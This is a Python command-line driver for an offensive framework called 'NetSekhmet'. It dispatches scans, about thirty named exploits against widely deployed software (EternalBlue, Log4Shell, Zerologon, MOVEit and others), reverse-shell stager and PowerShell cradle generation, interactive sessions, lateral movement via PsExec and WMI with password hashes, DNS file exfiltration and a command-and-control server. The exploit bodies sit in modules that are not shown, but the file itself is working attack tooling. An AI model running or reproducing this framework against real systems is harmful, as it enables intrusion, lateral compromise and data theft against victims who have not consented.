#!/usr/bin/env python3
import sys, os, argparse, json, asyncio
try:
    import readline
except ImportError:
    try: import pyreadline3 as readline
    except ImportError: pass

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))

from core.utils import log, BANNER, __version__
from core.scope import load_scope, save_scope
from core.scanner import PortScanner, validate_port_list
from core.sessions import SessionManager
from core.database import db_session, Host, Port, Credential, Vulnerability
from core.exploit_engine import ExploitEngine
from core.lateral_movement import LateralMovement
from core.exfiltration import Exfiltration
from core.reporter import ReportEngine
from core.payload_generator import PayloadGenerator
from core.correlation import CorrelationEngine

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description=f"NetSekhmet v{__version__}")
    sub = parser.add_subparsers(dest="cmd")

    scan = sub.add_parser("scan"); scan_s = scan.add_subparsers(dest="module")
    ports = scan_s.add_parser("ports"); ports.add_argument("-t","--target",required=True); ports.add_argument("-p","--ports",default="22,80,443,445,3389"); ports.add_argument("--nmap",action="store_true",default=True); ports.add_argument("--udp",action="store_true")

    exploit = sub.add_parser("exploit"); exploit_s = exploit.add_subparsers(dest="exploit_name")
    exploit_list = [
        "eternalblue_real","log4shell","zerologon","proxyshell","spring4shell",
        "bluekeep","smbghost","vcenter_rce","f5_rce","printnightmare","confluence_rce",
        "proxynotshell","struts2_rce","vmware_workspace_rce","dirtypipe",
        "cacti_rce","zimbra_rce","papercut_rce","moveit_rce",
        "screenconnect_auth_bypass","teamcity_auth_bypass","log4j2_rce",
        "exchange_proxylogon","drupalgeddon2","shellshock","heartbleed_scan",
        "thinkphp_rce","apache_path_traversal","wordpress_admin_shell","jenkins_rce"
    ]
    for name in exploit_list:
        p = exploit_s.add_parser(name); p.add_argument("--rhost",required=True); p.add_argument("--lhost",default=None); p.add_argument("--lport",type=int,default=4444)
    exploit_s.add_parser("list")

    auto = sub.add_parser("auto_exploit"); auto.add_argument("-t","--target",required=True)

    payload = sub.add_parser("payload"); payload_s = payload.add_subparsers(dest="payload_cmd")
    gen = payload_s.add_parser("generate"); gen.add_argument("--type",choices=["python","powershell","binary"],default="python"); gen.add_argument("--lhost",required=True); gen.add_argument("--lport",type=int,required=True); gen.add_argument("--output"); gen.add_argument("--encrypt",action="store_true",default=True)

    sess = sub.add_parser("sessions"); sess_s = sess.add_subparsers(dest="sess_cmd")
    sess_s.add_parser("list"); interact = sess_s.add_parser("interact"); interact.add_argument("id")
    kill = sess_s.add_parser("kill"); kill.add_argument("id")

    lateral = sub.add_parser("lateral"); lateral_s = lateral.add_subparsers(dest="lat_cmd")
    for m in ["ssh","psexec","wmi"]:
        p = lateral_s.add_parser(m); p.add_argument("-t","--target",required=True); p.add_argument("-u","--username",required=True); p.add_argument("-p","--password",default=""); p.add_argument("--hash",default=""); p.add_argument("--domain",default=""); p.add_argument("-c","--command",default="whoami")

    exfil = sub.add_parser("exfil"); exfil_s = exfil.add_subparsers(dest="exfil_cmd")
    dns = exfil_s.add_parser("dns"); dns.add_argument("--file",required=True); dns.add_argument("--domain",required=True)

    report = sub.add_parser("report"); report.add_argument("-t","--target",required=True); report.add_argument("-f","--format",choices=["html","pdf"],default="html"); report.add_argument("-o","--output")

    scope_cmd = sub.add_parser("scope"); scope_s = scope_cmd.add_subparsers(dest="scope_action")
    scope_s.add_parser("show"); scope_add = scope_s.add_parser("add"); scope_add.add_argument("--ip",action="append",default=[]); scope_add.add_argument("--domain",action="append",default=[])

    api = sub.add_parser("api"); api.add_argument("--host",default="0.0.0.0"); api.add_argument("--port",type=int,default=5000)
    web = sub.add_parser("web"); web.add_argument("--host",default="0.0.0.0"); web.add_argument("--port",type=int,default=5001)
    c2 = sub.add_parser("c2"); c2.add_argument("--host",default="0.0.0.0"); c2.add_argument("--port",type=int,default=8443); c2.add_argument("--protocol",choices=["tcp","http"],default="tcp")

    db_cmd = sub.add_parser("db"); db_s = db_cmd.add_subparsers(dest="db_action")
    for act in ["stats","hosts","creds","vulns"]: db_s.add_parser(act)

    args = parser.parse_args()
    if not args.cmd: parser.print_help(); return

    if args.cmd == "scan" and args.module == "ports":
        scanner = PortScanner(args.target, validate_port_list(args.ports), use_nmap=args.nmap, udp=args.udp)
        for port, info in sorted(scanner.scan().items()): print(f"  {port}/{info.get('proto','tcp')} {info['state']} {info.get('service')}")
    elif args.cmd == "exploit":
        if args.exploit_name == "list":
            for e in ExploitEngine.list_exploits(): print(f"  {e.name}: {e.description} ({e.cve})")
            return
        kwargs = {'rhost': args.rhost, 'lhost': args.lhost or '', 'lport': args.lport}
        result = ExploitEngine.run_exploit(args.exploit_name, **kwargs)
        if result: print(f"[{'SUCCESS' if result.success else 'FAILED'}] {result.output}")
    elif args.cmd == "auto_exploit": CorrelationEngine.run_auto(args.target)
    elif args.cmd == "payload" and args.payload_cmd == "generate":
        pg = PayloadGenerator()
        payload = pg.python_stager(args.lhost, args.lport, encrypt=args.encrypt) if args.type=="python" else pg.powershell_cradle(args.lhost, args.lport) if args.type=="powershell" else pg.binary_stager(args.lhost, args.lport)
        print("\n[*] Payload:\n" + (payload.decode() if isinstance(payload, bytes) else payload))
        if args.output:
            with open(args.output, 'wb' if isinstance(payload, bytes) else 'w') as f: f.write(payload)
    elif args.cmd == "sessions":
        sm = SessionManager()
        if args.sess_cmd == "list":
            for s in sm.list(): print(f"  {s['id']} {s['type']} on {s['host']} [{s['status']}]")
        elif args.sess_cmd == "interact":
            sid = args.id
            print(f"Interacting with session {sid}. Type 'exit' to quit.")
            while True:
                try:
                    cmd = input("netsekhmet> ")
                    if cmd.strip() == "exit": break
                    res = sm.send_command(sid, cmd)
                    print(res)
                except KeyboardInterrupt:
                    print()
                    break
                except EOFError:
                    break
        elif args.sess_cmd == "kill": sm.kill(args.id); print(f"[*] Session {args.id} killed.")
    elif args.cmd == "lateral":
        lm = LateralMovement(args.target, args.username, args.password, args.hash, args.domain)
        res = getattr(lm, args.lat_cmd)(args.command)
        print(res.get('output'))
    elif args.cmd == "exfil" and args.exfil_cmd == "dns":
        for r in Exfiltration.dns_exfil(args.file, args.domain): print(r)
    elif args.cmd == "report":
        html = ReportEngine.generate_html(args.target, args.output)
        if not args.output: print(html[:1000])
    elif args.cmd == "scope":
        scope = load_scope()
        if args.scope_action == "show": print(json.dumps(scope, indent=2))
        elif args.scope_action == "add":
            for ip in args.ip: scope['allowed_ips'].append(ip)
            for dom in args.domain: scope['allowed_domains'].append(dom)
            save_scope(scope)
    elif args.cmd == "api": from api.server import start_api; start_api(args.host, args.port)
    elif args.cmd == "web": from web.app import start_web; start_web(args.host, args.port)
    elif args.cmd == "c2": from c2.server import start_c2_server; start_c2_server(args.host, args.port, args.protocol)
    elif args.cmd == "db":
        with db_session() as db:
            if args.db_action == "stats": print(f"Hosts: {db.query(Host).count()}")
            elif args.db_action == "hosts":
                for h in db.query(Host).all(): print(f"  {h.ip_address}")

if __name__ == "__main__":
    main()
